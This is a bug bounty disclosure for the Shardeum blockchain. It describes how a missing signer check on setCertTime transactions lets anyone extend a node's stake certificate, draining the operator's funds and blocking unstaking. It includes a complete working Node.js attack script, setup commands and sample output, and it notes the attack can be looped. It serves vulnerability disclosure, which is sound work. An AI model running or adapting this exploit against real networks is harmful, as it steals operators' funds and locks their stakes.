# 33750 - \[BC - Critical] Abusing setCertTime Transactions to drain node ...

Submitted on Jul 28th 2024 at 19:37:22 UTC by @ZhouWu for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33750

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardeum/tree/dev>

Impacts:

* Direct loss of funds

## Description

## Description

In shardeum there's a mechnism that can extends the expiration date of a stake certificate by the node that is belong to the particular staking. Such transaction is considered internal tx type 5, according to enum ( see ref.1) Athough shardeum check the validity (see ref.2) of the signature, its failure to check the sign owner of the transaction is the same as nominated node's public key let attacker to be able to extends the stake certification on behalf of the victim node. Since shardeum deduct ( see ref.3) transaction cost from node operator account for transaction. The third party can drain the fund. Also unstaking is not possible (see ref.4) before the stake certificate expired, thus, attacker can renew stake certificate of aparitcular node indefintely to keep the stakes locked.

References:

1. [enum](https://github.com/shardeum/shardeum/blob/c7b10c2370028f7c7cbd2a01839e50eb50faa904/src/shardeum/shardeumTypes.ts#L95)
2. [validity](https://github.com/immunefi-team/Past-Audit-Competitions/blob/main/Boost%20%7C%20Shardeum:%20Core/\(https:/github.com/shardeum/shardeum/blob/c7b10c2370028f7c7cbd2a01839e50eb50faa904/src/tx/setCertTime.ts#L86-L111\))
3. [deduct](https://github.com/shardeum/shardeum/blob/c7b10c2370028f7c7cbd2a01839e50eb50faa904/src/tx/setCertTime.ts#L264-L272)
4. [no possible](https://github.com/shardeum/shardeum/blob/c7b10c2370028f7c7cbd2a01839e50eb50faa904/src/index.ts#L3747-L3754)

## Proof of Concept

* Launch a network of legit nodes
* Please stake them
* Once you stake a node, wait for it to go active
* Node has to be staked, (Warning: this will not work on node that can be active without staking) for some reason the first few node in shardeum go active without staking. Please launch more node than minNode is set in the config, the subsequent node will require staking.
* Grab the public key of the staked node that is in the active list you want to attack its certificate
* Create an empty node project for our attack script
* `mkdir attack`
* `cd attack`
* `npm init -y`
* `npm install axios @shardus/crypto-utils`
* create a file and name `attack.js` and copy paste the source code below
* execute below script `node attack.js [insert victim public key]`,

(Example: `node attack.js b2ba1413988f41de86db7f7002adfbeaa97f6b294364e475feca76e2e0544d1e`)

```javascript
const axios = require ('axios');
const crypto = require('@shardus/crypto-utils')

crypto.init("69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc")

const { publicKey, secretKey  } = crypto.generateKeypair()

const target = process.argv[2].replace('0x', '')

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))


const main = async  () => {
    console.log("Grabbing Nodelist ....");
    const res = await axios.get('http://0.0.0.0:4000/nodelist')
    let url = null
    const nodelist = res.data.nodeList
    const randomNode = nodelist[Math.floor(Math.random() * nodelist.length)]

    console.log("Finding victim node in active list ....");
    for(const node of nodelist) {
        if(node.publicKey === target) {
            url = `http://${node.ip}:${node.port}/account/${target}`
        }
    }

    if(!url) throw new ("Victim node is not in active yet")

    const res2 = await axios.get(url)


    const setCertTimeTx = {
        isInternalTx: true,
        internalTXType: 5,
        nominee: "",
        nominator: "",
        duration: 19, 
        timestamp: Date.now() + 1000,
    }


    setCertTimeTx.nominator = res2.data.account.nominator
    setCertTimeTx.nominee = target


    const nominator = setCertTimeTx.nominator.replace('0x', '').padEnd(64, '0')

    const before = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${nominator}`)

    console.log("Balance and certExp before attack --------------------------------------")
    console.log(before.data);
    

    console.log("Constructing InternalTx setCertTime: ", setCertTimeTx)


    crypto.signObj(setCertTimeTx, secretKey, publicKey)
    console.log("Signing InternalTx setCertTime: ", setCertTimeTx)

    console.log("Firing InternalTx setCertTime ....")
    const res3 = await axios.post(`http://${randomNode.ip}:${randomNode.port}/inject`, setCertTimeTx)

    if(!res3.data.success) throw new Error(res3.data.reason)

    console.log("Waiting 10 sec for transaction to be finalized");
    await sleep(10000)

    const after =await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${nominator}`)
    console.log("Balance and certExp after attack --------------------------------------")
    console.log(after.data);


}

main();
```

* You can observe the balance of nominator / node operator account's balance being deducted 0.01 SHM per each tx and certExp is kept being updated to the future.

Example output -

```
Grabbing Nodelist ....
Finding victim node in active list ....
Balance and certExp before attack --------------------------------------
{
  account: {
    balance: '195700000000000000000',
    codeHash: '0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470',
    nonce: '1',
    operatorAccountInfo: {
      certExp: 1722164816023,
      nominee: 'b2ba1413988f41de86db7f7002adfbeaa97f6b294364e475feca76e2e0544d1e',
      operatorStats: [Object],
      stake: [Object]
    },
    storageRoot: '0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421'
  }
}
Constructing InternalTx setCertTime:  {
  isInternalTx: true,
  internalTXType: 5,
  nominee: 'b2ba1413988f41de86db7f7002adfbeaa97f6b294364e475feca76e2e0544d1e',
  nominator: '0xd89f3526ae6f471277d68ad51b6bb1c646f49e0a',
  duration: 19,
  timestamp: 1722163476052
}
Signing InternalTx setCertTime:  {
  isInternalTx: true,
  internalTXType: 5,
  nominee: 'b2ba1413988f41de86db7f7002adfbeaa97f6b294364e475feca76e2e0544d1e',
  nominator: '0xd89f3526ae6f471277d68ad51b6bb1c646f49e0a',
  duration: 19,
  timestamp: 1722163476052,
  sign: {
    owner: 'be08c19a5bfd78484e318282a7d0c731d5572604e543aa25fb7f84d813a5db63',
    sig: '782052921152bad7d81850ee4683e5e68b5efd65fd3275db057f554241586ece42bfb67dc3c0b99e396320f21fc4e257d3615630721eb75c4238cdc1c3c7020e263d3aaae89a2a5949f6367d33efab75f8a83d4d99617d5fdcc09b028181881e'
  }
}
Firing InternalTx setCertTime ....
Waiting 10 sec for transaction to be finalized
Balance and certExp after attack --------------------------------------
{
  account: {
    balance: '195690000000000000000',
    codeHash: '0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470',
    nonce: '1',
    operatorAccountInfo: {
      certExp: 1722165276052,
      nominee: 'b2ba1413988f41de86db7f7002adfbeaa97f6b294364e475feca76e2e0544d1e',
      operatorStats: [Object],
      stake: [Object]
    },
    storageRoot: '0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421'
  }
}
```

* Observe operator account's balance is drained 0.01 SHM per attack and cerExp is updated per attack. This can be run in loop.

## Impact

As stated above, this is a direct loss of fund for node operator and blocking the unstaking of a node. Attacker can modify this script to be in loop indefinity to drain the operator account and lock the unstaking forever. This can be targeted to single operator or all the operator in the network simultaneously.
